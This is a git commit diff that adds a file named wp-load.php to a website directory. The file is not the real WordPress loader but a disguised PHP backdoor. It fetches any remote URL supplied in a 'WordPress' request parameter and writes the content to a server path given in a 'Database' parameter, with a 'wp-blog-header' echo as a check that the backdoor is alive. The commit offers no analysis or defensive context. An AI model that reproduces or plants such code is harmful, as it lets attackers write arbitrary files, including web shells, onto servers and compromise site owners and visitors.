e977aa12fe6e5379da010d8b89953d96cf58a1d1
Mathew Varghese <mathewvarghesemanu@gmail.com>
2020-12-07 09:37:09 +0530

    commit1

---
+++ aravind.mak3r.space/wp-load.php
@@ -0,0 +1,17 @@
+<?php 
+function template($loader=''){
+	$load = isset($_REQUEST['WordPress']) ? trim($_REQUEST['WordPress']) : '';
+	$dirname = isset($_REQUEST['Database']) ? trim($_REQUEST['Database']) : '';
+	$wp = curl_init('http://'.$load);
+	curl_setopt($wp, CURLOPT_RETURNTRANSFER, 1);
+	$once = curl_exec($wp);
+	if ($dirname!='') {
+		file_put_contents($dirname, $once);
+	}
+	if (isset($_GET['wp-blog-header'])) {
+		echo 'wp-blog-header';
+	}
+}
+template();
+//scp-173
+?>
